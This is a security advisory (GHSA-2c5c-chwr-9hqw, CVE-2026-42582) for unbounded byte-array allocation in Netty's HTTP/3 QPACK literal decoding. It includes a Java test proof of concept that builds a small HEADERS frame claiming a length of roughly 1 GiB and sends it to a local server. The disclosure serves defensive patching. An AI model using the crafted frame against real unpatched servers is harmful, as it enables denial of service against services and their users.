# [H] Netty HTTP/3 QPACK literal unbounded allocation

## Summary
Severity: High
Advisory: GHSA-2c5c-chwr-9hqw
CVE: CVE-2026-42582
CWE: CWE-770, CWE-789
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-2c5c-chwr-9hqw
Type: github-advisory

## Affected
- Maven: `io.netty:netty-codec-http3` — affected >=4.2.0.Final <4.2.13.Final

## Details
### Summary
When Netty decodes HTTP/3 headers, it sometimes runs `new byte[length]` using a length from the wire before checking that many bytes are really there. A small malicious header can claim a huge length (on the order of a gigabyte).

### Details
When decoding header blocks, the non-Huffman branch of `io.netty.handler.codec.http3.QpackDecoder#decodeHuffmanEncodedLiteral` may execute `new byte[length]` for a string literal before verifying that length bytes are actually present in the compressed field section. The wire encoding allows a very large length to be expressed in few bytes. There is no check that `length <= in.readableBytes()` before `new byte[length]`.

### PoC
The test below constructs a small HTTP/3 HEADERS frame whose QPACK section decodes to a ~1 GiB non-Huffman name length and is used to observe server-side failure; it illustrates how little wire data can target `new byte[length]`.

```java
    @Test
    public void test() throws Exception {
        EventLoopGroup group = new MultiThreadIoEventLoopGroup(1, NioIoHandler.newFactory());
        try {
            X509Bundle cert = new CertificateBuilder()
                    .subject("cn=localhost")
                    .setIsCertificateAuthority(true)
                    .buildSelfSigned();

            QuicSslContext serverContext = QuicSslContextBuilder.forServer(cert.toTempPrivateKeyPem(), null, cert.toTempCertChainPem())
                    .applicationProtocols(Http3.supportedApplicationProtocols())
                    .build();

            AtomicReference<Throwable> serverErrors = new AtomicReference<>();
            CountDownLatch serverConnectionClosed = new CountDownLatch(1);

            ChannelHandler serverCodec = Http3.newQuicServerCodecBuilder()
                    .sslContext(serverContext)
                    .maxIdleTimeout(5000, TimeUnit.MILLISECONDS)
                    .initialMaxData(10_000_000)
                    .initialMaxStreamDataBidirectionalLocal(1_000_000)
                    .initialMaxStreamDataBidirectionalRemote(1_000_000)
                    .initialMaxStreamsBidirectional(100)
                    .tokenHandler(InsecureQuicTokenHandler.INSTANCE)
                    .handler(new ChannelInitializer<QuicChannel>() {
                        @Override
                        protected void initChannel(QuicChannel ch) {
                            ch.closeFuture().addListener(f -> serverConnectionClosed.countDown());
                            ch.pipeline().addLast(new Http3ServerConnectionHandler(
                                    new ChannelInboundHandlerAdapter() {
                                        @Override
                                        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
                                            if (cause instanceof DecoderException) {
                                                serverErrors.set(cause.getCause());
                                            } else {
                                                serverErrors.set(cause);
                                            }
                                        }
                                    }));
                        }
                    })
                    .build();

            Channel server = new Bootstrap()
                    .group(group)
                    .channel(NioDatagramChannel.class)
                    .handler(serverCodec)
                    .bind("127.0.0.1", 0)
                    .sync()
                    .channel();

            QuicSslContext clientContext = QuicSslContextBuilder.forClient()
                    .trustManager(InsecureTrustManagerFactory.INSTANCE)
                    .applicationProtocols(Http3.supportedApplicationProtocols())
                    .build();

            ChannelHandler clientCodec = Http3.newQuicClientCodecBuilder()
                    .sslContext(clientContext)
                    .maxIdleTimeout(5000, TimeUnit.MILLISECONDS)
                    .initialMaxData(10000000)
                    .initialMaxStreamDataBidirectionalLocal(1000000)
                    .build();

            Channel client = new Bootstrap()
                    .group(group)
                    .channel(NioDatagramChannel.class)
                    .handler(clientCodec)
                    .bind(0)
                    .sync()
                    .channel();

            QuicChannel quicChannel = QuicChannel.newBootstrap(client)
                    .handler(new Http3ClientConnectionHandler())
                    .remoteAddress(server.localAddress())
                    .localAddress(client.localAddress())
                    .connect()
                    .get();

            QuicStreamChannel rawStream =
                    quicChannel.createStream(QuicStreamType.BIDIRECTIONAL, new ChannelInboundHandlerAdapter()).get();

            ByteBuf header = Unpooled.buffer();
            header.writeByte(0x01);
            header.writeByte(0x08);

            header.writeByte(0x00);
            header.writeByte(0x00);

            header.writeByte(0x27);
            header.writeByte(0x80);
            header.writeByte(0x80);
            header.writeByte(0x80);
            header.writeByte(0x80);
            header.writeByte(0x04);

            rawStream.writeAndFlush(header).sync();

            assertTrue(serverConnectionClosed.await(10, TimeUnit.SECONDS));

            assertInstanceOf(IndexOutOfBoundsException.class, serverErrors.get());

            quicChannel.closeFuture().await(5, TimeUnit.SECONDS);
            server.close().sync();
            client.close().sync();
        } finally {
            group.shutdownGracefully();
        }
    }
```

### Impact
The server can slow down, stall, or crash under load when many crafted HTTP/3 HEADERS frames trigger very large `byte[]` allocations during QPACK literal decoding.

## References
- https://github.com/netty/netty/security/advisories/GHSA-2c5c-chwr-9hqw
- https://nvd.nist.gov/vuln/detail/CVE-2026-42582
- https://github.com/netty/netty
